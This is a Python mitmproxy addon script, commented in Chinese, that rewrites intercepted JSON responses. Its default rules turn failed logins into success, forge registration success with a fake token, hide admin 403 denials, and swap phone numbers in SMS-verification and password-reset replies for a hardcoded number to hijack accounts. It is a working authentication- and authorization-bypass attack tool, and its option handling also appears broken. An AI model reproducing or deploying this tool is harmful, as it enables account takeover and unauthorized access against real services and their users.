from mitmproxy import http
import json
import re
import os

class ResponseModifier:
    def __init__(self):
        self.rules = []
        self.custom_phone = "18013172275"  # 默认替换手机号
        self.rules_file = None
    
    def load_rules(self, rules):
        """加载修改规则"""
        self.rules = rules
        print(f"[INFO] Loaded {len(rules)} custom rules")
    
    def load_rules_from_file(self, file_path):
        """从文件加载规则"""
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    rules = json.load(f)
                    self.rules = rules
                    self.rules_file = file_path
                    print(f"[INFO] Loaded {len(rules)} rules from {file_path}")
            except Exception as e:
                print(f"[ERROR] Failed to load rules from {file_path}: {e}")
    
    def set_custom_phone(self, phone):
        """设置自定义替换手机号"""
        self.custom_phone = phone
        print(f"[INFO] Custom phone set to: {phone}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        # 检查是否有自定义规则
        if self.rules:
            self.apply_custom_rules(flow)
            return
        
        # 默认规则：尝试修改常见场景
        self.apply_default_rules(flow)
    
    def apply_custom_rules(self, flow: http.HTTPFlow) -> None:
        """应用自定义修改规则"""
        for rule in self.rules:
            # 检查URL匹配
            if not re.search(rule.get('url_pattern', ''), flow.request.path):
                continue
            
            # 检查方法匹配
            if rule.get('method') and flow.request.method != rule['method']:
                continue
            
            # 只处理JSON响应
            content_type = flow.response.headers.get("Content-Type", "")
            if "application/json" not in content_type:
                continue
            
            try:
                data = flow.response.json()
                
                # 应用修改操作
                actions = rule.get('actions', [])
                for action in actions:
                    field = action.get('field')
                    value = action.get('value')
                    condition = action.get('condition')
                    
                    # 检查条件
                    if condition:
                        cond_field, cond_value = list(condition.items())[0]
                        if data.get(cond_field) != cond_value:
                            continue
                    
                    # 修改字段
                    if field:
                        # 支持嵌套字段，如 data.user_id
                        fields = field.split('.')
                        current = data
                        for f in fields[:-1]:
                            if isinstance(current, dict) and f in current:
                                current = current[f]
                            else:
                                break
                        else:
                            current[fields[-1]] = value
                
                flow.response.set_text(json.dumps(data, ensure_ascii=False))
                
            except Exception as e:
                print(f"Error modifying response: {e}")
    
    def apply_default_rules(self, flow: http.HTTPFlow) -> None:
        """应用默认修改规则"""
        content_type = flow.response.headers.get("Content-Type", "")
        
        # 只处理JSON响应
        if "application/json" not in content_type:
            return
        
        try:
            data = flow.response.json()
            modified = False
            
            # 场景1：登录接口 - 将失败改为成功
            if re.search(r'/api/(login|signin)', flow.request.path, re.IGNORECASE):
                if data.get("code") in [400, 401, 500] or data.get("status") in ["error", "failed"]:
                    data["code"] = 0
                    data["status"] = "success"
                    data["message"] = "登录成功"
                    modified = True
            
            # 场景2：注册接口 - 绕过验证
            elif re.search(r'/api/(register|signup)', flow.request.path, re.IGNORECASE):
                if data.get("code") in [400, 409] or data.get("status") == "error":
                    data["code"] = 0
                    data["status"] = "success"
                    data["message"] = "注册成功"
                    if "data" not in data:
                        data["data"] = {"user_id": 999, "token": "fake_token_abc123"}
                    modified = True
            
            # 场景3：短信验证码 - 修改手机号
            elif re.search(r'/api/(sms|verify|code)', flow.request.path, re.IGNORECASE):
                if "phone" in data or "mobile" in data or "data" in data:
                    # 将响应中的手机号替换为自定义手机号
                    phone_fields = ["phone", "mobile", "data", "mobile_phone"]
                    for field in phone_fields:
                        if field in data and isinstance(data[field], str):
                            data[field] = self.custom_phone
                    modified = True
            
            # 场景4：权限检查 - 绕过权限验证
            elif re.search(r'/api/admin/', flow.request.path, re.IGNORECASE):
                if data.get("code") == 403 or data.get("message") == "权限不足":
                    data["code"] = 0
                    data["message"] = "操作成功"
                    modified = True
            
            # 场景5：密码重置 - 修改返回的手机号
            elif re.search(r'/api/(forgot|reset|password)', flow.request.path, re.IGNORECASE):
                if data.get("status") == 200 and "data" in data:
                    data["data"] = self.custom_phone
                    modified = True
            
            # 如果有修改，更新响应
            if modified:
                flow.response.set_text(json.dumps(data, ensure_ascii=False))
                print(f"[MODIFIED] {flow.request.path}")
                
        except Exception as e:
            pass

# 创建修改器实例
addons = [ResponseModifier()]

def load(l):
    """加载命令行参数"""
    l.add_option(
        "rules",
        str,
        "",
        "JSON格式的修改规则"
    )
    l.add_option(
        "rules_file",
        str,
        "",
        "JSON规则文件路径"
    )
    l.add_option(
        "phone",
        str,
        "18013172275",
        "自定义替换手机号"
    )

def configure(updated):
    """配置修改器"""
    for addon in addons:
        if isinstance(addon, ResponseModifier):
            # 加载自定义手机号
            if "phone" in updated:
                phone = updated.get("phone", "18013172275")
                addon.set_custom_phone(phone)
            
            # 优先从文件加载规则
            if "rules_file" in updated:
                rules_file = updated.get("rules_file", "")
                if rules_file:
                    addon.load_rules_from_file(rules_file)
                    return
            
            # 其次使用命令行JSON规则
            if "rules" in updated:
                rules_json = updated.get("rules", "")
                if rules_json:
                    try:
                        rules = json.loads(rules_json)
                        addon.load_rules(rules)
                    except json.JSONDecodeError:
                        print("Invalid rules JSON")
